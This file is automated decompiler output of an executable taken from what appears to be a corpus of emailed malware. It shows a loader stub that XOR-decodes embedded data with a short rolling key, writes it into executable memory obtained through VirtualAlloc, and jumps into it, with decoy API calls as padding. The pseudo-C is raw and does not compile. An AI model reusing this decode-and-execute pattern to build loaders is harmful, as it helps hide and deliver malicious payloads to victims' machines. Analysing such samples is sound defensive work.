// subject.c
// Generated on 5/4/2015 1:15:33 AM by decompiling malware_via_email/malware_0530/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

word32 fn1310D000(word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word32 ebx_16 = dwArg14;
	Eq_10 * dwArg08_109 = dwArg08 + dwArg14;
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		AddAtomW(0xB8000000);
		ebx_16 = (word32) ((int32) wLoc1C)[dwArg18];
		dwArg04->b0000 = (byte) ((int32) dwArg08_109->b0000 ^ ebx_16);
		wLoc1C = (word16) ((word32) wLoc1C + 0x00000001);
		if ((int32) wLoc1C == 0x00000005)
			wLoc1C = 0x0000;
		dwArg04 = dwArg04 + 1;
		dwArg08_109 = dwArg08_109 + 1;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return ebx_16;
}

void fn1310D0A9(word32 edx, word32 ebp)
{
	InitCommonControls();
	GetLastError();
	ImageList_DragEnter(0x00BD0000, 0x0AA00000, 0x00000268);
	AddAtomW(0x00080000);
	word32 ecx_36 = ImageList_Draw(0x00234000, 0x00460000, 0x40000000, 0x00023C00, 0x000D6000, 0x0003F400) + edx;
	word32 v11_43 = (ecx_36 ^ 0x800401F0) + 0x930CE14A;
	word32 esi_47 = Mem0[v11_43 + 0x00000000:word32];
	word32 esp_418 = fp - 0x000002E0;
	if ((ecx_36 ^ 0x800401F0) != 0x800401F0)
	{
		Mem419[fp - 0x000002E4:word32] = 0x00000000;
		esp_418 = fp - 0x000002E4;
	}
	word32 esp_59 = esp_418 - 0x00000004;
	Mem60[esp_59 + 0x00000000:word32] = fp - 0x00000010;
	Mem62[esp_59 - 0x00000004:word32] = 0x00000004;
	Mem65[esp_59 - 0x00000008:word32] = fp + 0xFFFFFDC4;
	Mem68[esp_59 - 0x0000000C:word32] = fp + 0xFFFFFDC4;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 eax_81 = Mem68[v11_43 + 0x00000004:word32];
	Mem85[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	Mem87[esp_59 + 0x00000004:word32] = 0x00000004;
	Mem90[esp_59 + 0x00000000:word32] = fp - 0x00000010;
	Mem92[esp_59 - 0x00000004:word32] = 0x00000004;
	Mem97[esp_59 - 0x00000008:word32] = fp + 0xFFFFFDA4;
	Mem100[esp_59 - 0x0000000C:word32] = fp + 0xFFFFFDA8;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 esi_104 = Mem100[v11_43 + 0x00000008:word32];
	Mem108[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	Mem110[esp_59 + 0x00000004:word32] = 0x00000008;
	Mem113[esp_59 + 0x00000000:word32] = fp - 0x00000010;
	Mem115[esp_59 - 0x00000004:word32] = 0x00000004;
	Mem120[esp_59 - 0x00000008:word32] = fp - 0x0000001C;
	Mem123[esp_59 - 0x0000000C:word32] = fp - 0x00000014;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 eax_136 = Mem123[v11_43 + 0x0000000C:word32];
	Mem140[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	Mem143[esp_59 + 0x00000004:word32] = 0x0000000C;
	Mem146[esp_59 + 0x00000000:word32] = fp - 0x00000010;
	Mem148[esp_59 - 0x00000004:word32] = 0x00000004;
	Mem153[esp_59 - 0x00000008:word32] = fp - 0x00000028;
	Mem156[esp_59 - 0x0000000C:word32] = fp - 0x0000001C;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	word32 dwLoc0248_170 = Mem156[v11_43 + 0x00000010:word32];
	Mem173[esp_59 + 0x00000008:word32] = fp + 0xFFFFFDCC;
	Mem176[esp_59 + 0x00000004:word32] = 0x00000010;
	Mem179[esp_59 + 0x00000000:word32] = fp - 0x00000010;
	Mem181[esp_59 - 0x00000004:word32] = 0x00000004;
	Mem186[esp_59 - 0x00000008:word32] = fp + 0xFFFFFDA8;
	Mem189[esp_59 - 0x0000000C:word32] = fp + 0xFFFFFDB8;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	Mem202[esp_59 + 0x00000008:word32] = 0x00000040;
	Mem204[esp_59 + 0x00000004:word32] = 0x00003000;
	word32 edx_199 = esi_104 * 0x00000008 + 0x0000000C;
	word32 v15_208 = edx_199 + eax_81;
	word32 v16_211 = v15_208 + esi_47;
	Mem215[esp_59 + 0x00000000:word32] = v16_211;
	Mem219[esp_59 - 0x00000004:word32] = (ecx_36 ^ 0x800401F0) - 0x800401F0;
	word32 dwLoc024C_194 = 0x00000014;
	word32 dwLoc24_197 = v11_43 + 0x00000014;
	word32 eax_220 = VirtualAlloc(Mem219[esp_59 - 0x00000004:LPVOID], Mem219[esp_59 + 0x00000000:SIZE_T], Mem219[esp_59 + 4:DWORD], Mem219[esp_59 + 8:DWORD]);
	word32 esp_221 = esp_59 + 0x0000000C;
	word32 dwLoc0C_227 = eax_136 + 0x13100000 + edx_199;
	word32 dwLoc0264_231 = edx_199;
	word32 dwLoc08_232 = 0x00000000;
	word32 dwLoc18_233 = 0x00000000;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0264_231 == dwLoc0248_170)
		{
			word32 edi_346 = dwLoc08_232 + 0x00000001;
			dwLoc08_232 = edi_346;
			if (edi_346 == esi_104)
				goto l1310D46A;
			word32 edi_352 = Mem219[dwLoc24_197 + 0x00000000:word32];
			word32 esp_355 = esp_221 - 0x00000004;
			Mem356[esp_355 + 0x00000000:word32] = fp + 0xFFFFFDCC;
			Mem359[esp_355 - 0x00000004:word32] = dwLoc024C_194;
			Mem362[esp_355 - 0x00000008:word32] = fp - 0x00000010;
			Mem364[esp_355 - 0x0000000C:word32] = 0x00000004;
			Mem369[esp_355 - 0x00000010:word32] = fp - 0x0000001C - dwLoc024C_194;
			Mem372[esp_355 - 0x00000014:word32] = fp - 0x0000001C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			word32 eax_382 = dwLoc24_197 + 0x00000004;
			dwLoc0248_170 = Mem372[eax_382 + 0x00000000:word32];
			Mem389[esp_355 + 0x00000000:word32] = fp + 0xFFFFFDCC;
			word32 eax_379 = dwLoc024C_194 + 0x00000004;
			Mem392[esp_355 - 0x00000004:word32] = eax_379;
			Mem395[esp_355 - 0x00000008:word32] = fp - 0x00000010;
			Mem397[esp_355 - 0x0000000C:word32] = 0x00000004;
			Mem402[esp_355 - 0x00000010:word32] = fp + 0xFFFFFDB8 - eax_379;
			Mem405[esp_355 - 0x00000014:word32] = fp + 0xFFFFFDB8;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			esp_221 = esp_355 + 0x00000004;
			dwLoc024C_194 = eax_379 + 0x00000004;
			dwLoc24_197 = eax_382 + 0x00000004;
			dwLoc0264_231 = 0x00000000;
			dwLoc0C_227 = edi_352 + 0x13100000;
			goto l1310D425;
		}
l1310D425:
		Mem331[eax_220 + dwLoc18_233:byte] = Mem219[dwLoc0C_227 + 0x00000000:byte];
		dwLoc0C_227 = dwLoc0C_227 + 0x00000001;
		dwLoc18_233 = dwLoc18_233 + 0x00000001;
		dwLoc0264_231 = dwLoc0264_231 + 0x00000001;
	}
l1310D46A:
	word32 esp_258 = esp_221 - 0x00000004;
	Mem259[esp_258 + 0x00000000:word32] = fp + 0xFFFFFDCC;
	Mem262[esp_258 - 0x00000004:word32] = edx_199;
	Mem265[esp_258 - 0x00000008:word32] = fp + 0xFFFFFDC8;
	Mem268[esp_258 - 0x0000000C:word32] = eax_81;
	Mem273[esp_258 - 0x00000010:word32] = eax_220 - edx_199;
	Mem276[esp_258 - 0x00000014:word32] = eax_220;
	word32 ebx_277 = fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	Mem286[esp_258 + 0x00000000:word32] = fp;
	Mem289[esp_258 - 0x00000004:word32] = fp + 0xFFFFFDCC;
	Mem292[esp_258 - 0x00000008:word32] = eax_81;
	Mem295[esp_258 - 0x0000000C:word32] = esi_47;
	Mem298[esp_258 - 0x00000010:word32] = eax_220;
	word32 edx_300 = eax_220 + eax_81;
	Mem303[esp_258 - 0x00000014:word32] = edx_300;
	(eax_220 + 0x00000F50)();
	Mem309[esp_258 - 0x00000018:word32] = 0x00000000;
	ExitProcess(Mem309[esp_258 - 0x00000018:UINT]);
	return;
}

